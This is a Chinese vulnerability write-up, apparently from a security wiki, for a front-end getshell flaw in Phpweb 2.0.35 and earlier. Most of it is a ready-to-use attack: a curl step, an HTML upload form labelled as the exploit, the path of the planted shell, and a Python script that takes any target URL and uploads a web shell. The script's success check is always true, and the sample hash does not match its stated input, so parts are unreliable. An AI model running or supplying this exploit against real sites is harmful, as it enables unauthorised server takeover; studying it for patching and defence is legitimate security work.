Phpweb 前台getshell
===================

一、漏洞简介
------------

漏洞影响文件:/base/post.php /base/appfile.php /base/appplue.php
/base/appborder.php

二、漏洞影响
------------

Phpweb\<=2.0.35

三、复现过程
------------

### 1.首先要获取加密前的Md5值，用于文件较检,通过Post提交数据来获取!

    curl "http://website/base/post.php" -H "act=appcode"

![](/Users/aresx/Documents/VulWiki/.resource/Phpweb前台getshell/media/rId25.png)

    ac34c64cdb405eff881efc5476a64761 ##这个就是初始值

### 2.获取加密后得md5值

然后将初始值md5加密(ac34c64cdb405eff881efc5476a64761 + "a")

得到加密后的MD5值!

    e10adc3949ba59abbe56e057f20f883e ##这个就是加密后的md5值(终值)!

3.Getsehll exp:

    <html>
    <body>
    <form action="http://0-sec.org/base/appfile.php" method="post" enctype="multipart/form-data">
    <label for="file">Filename:</label>
    <input type="file" name="file" id="file" />
    <input type="text" name="t" value="a" />
    <input type="text" name="m" value="25a824696cb75a44aabd05a08070789f" />
    <input type="text" name="act" value="upload" />
    <input type="text" name="r_size" value="14" />
    <br />
    <input type="submit" name="submit" value="getshell" />
    </form>
    </body>
    </html>

![](/Users/aresx/Documents/VulWiki/.resource/Phpweb前台getshell/media/rId27.png)

然后...Getshell!

![](/Users/aresx/Documents/VulWiki/.resource/Phpweb前台getshell/media/rId28.png)

当出现OK两个大字时,说明你成功了!!!

上传的shell路径是

[http://www.0-sec.org/effect/source/bg/shell名称.php](http://www.0-sec.org/effect/source/bg/shell名称.php)

![](/Users/aresx/Documents/VulWiki/.resource/Phpweb前台getshell/media/rId30.png)

### 工具编写

Python exp\[Python3\]:

    # -*- coding: UTF-8 -*- #
    import os
    import requests
    import hashlib

    bdlj = os.getcwd()
    headers = open(bdlj+"\headers.txt",'r')
    headerss = headers.read()
    print('\b')

    ur = input("请输入目标网址:")
    requrl =  ur + '/base/post.php'
    reqdata = {"act":"appcode"}
    r = requests.post(requrl,data=reqdata)
    cz=r.text[2:34]
    print ('初值:' + cz)

    cz=r.text[2:34]+"a"
    m = hashlib.md5()
    b = cz.encode(encoding='utf-8')
    m.update(b)
    zz = m.hexdigest()
    print ('终值:' + zz)

    infile = open(bdlj + "\datas.txt", "r",encoding='utf-8')
    outfile = open(bdlj + "\datah.txt", "w",encoding='utf-8')
    for line in infile:
          outfile.write(line.replace('156as1f56safasfasfa', zz))
    infile.close()
    outfile.close()
    datas = open(bdlj+"\datah.txt",'r')
    datass = datas.read()

    gs = requests.post(ur + '/base/appfile.php',data=datass,headers={'Content-Type':headerss})
    gs.encoding = 'utf-8'
    print (gs.text)

    if {gs.text == "OK"}:
        print ("Getshell成功! Shell:" + ur + "/effect/source/bg/mstir.php")
    else:
        print ("Getsehll失败!")

整包下载地址:<https://github.com/ianxtianxt/Phpweb-Getshell-py>

使用请下载整包,否则会缺少协议头和data数据!

使用教程:

![](/Users/aresx/Documents/VulWiki/.resource/Phpweb前台getshell/media/rId33.png)

参考链接
--------

> <https://m4tir.github.io/Phpweb-Reception-Getshell>
